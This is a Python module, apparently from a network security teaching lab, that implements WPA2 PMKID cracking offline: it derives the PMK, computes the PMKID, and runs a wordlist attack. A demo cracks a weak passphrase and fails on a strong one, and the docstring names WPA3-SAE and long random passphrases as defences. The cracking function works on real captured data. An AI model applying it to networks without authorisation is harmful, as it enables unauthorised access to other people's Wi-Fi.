# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""WPA2 PMKID crack: the offline crypto, fully runnable without any radio.

The PMK is PBKDF2-HMAC-SHA1(passphrase, SSID, 4096, 32) and the PMKID is
HMAC-SHA1(PMK, "PMK Name" | AP_MAC | STA_MAC)[:16]. Capturing the PMKID (which
needs a monitor-mode radio) lets an attacker test passphrases offline; a long
random passphrase or WPA3-SAE defeats it. This module implements the maths so the
crack itself is testable in the netns lab.
"""

from __future__ import annotations

import hashlib
import hmac
from collections.abc import Iterable

from netlab_core import verdict


def pmk(passphrase: str, ssid: str) -> bytes:
    return hashlib.pbkdf2_hmac("sha1", passphrase.encode(), ssid.encode(), 4096, 32)


def pmkid(key: bytes, ap_mac: str, sta_mac: str) -> bytes:
    data = (
        b"PMK Name"
        + bytes.fromhex(ap_mac.replace(":", ""))
        + bytes.fromhex(sta_mac.replace(":", ""))
    )
    return hmac.new(key, data, hashlib.sha1).digest()[:16]


def crack_pmkid(
    target: bytes, ssid: str, ap_mac: str, sta_mac: str, wordlist: Iterable[str]
) -> str | None:
    """Return the passphrase that produces ``target``, or None if not in the list."""
    for candidate in wordlist:
        if pmkid(pmk(candidate, ssid), ap_mac, sta_mac) == target:
            return candidate
    return None


def demo() -> None:
    """Reference scenario: crack a weak passphrase, fail on a strong one."""
    ssid, ap, sta = "corp-wifi", "aa:bb:cc:00:00:01", "11:22:33:44:55:66"
    target = pmkid(pmk("password1", ssid), ap, sta)
    wordlist = ["admin", "letmein", "password1", "hunter2"]
    print("--- 1) weak passphrase in the wordlist ---")
    found = crack_pmkid(target, ssid, ap, sta, wordlist)
    verdict("ALERT", f"cracked passphrase: {found!r}")
    print("\n--- 2) strong passphrase (not in the wordlist / use WPA3-SAE) ---")
    strong = pmkid(pmk("Tr0ub4dor&3-x9qz!", ssid), ap, sta)
    result = crack_pmkid(strong, ssid, ap, sta, wordlist)
    verdict("FORWARD" if result is None else "DROP", f"crack result: {result!r}")
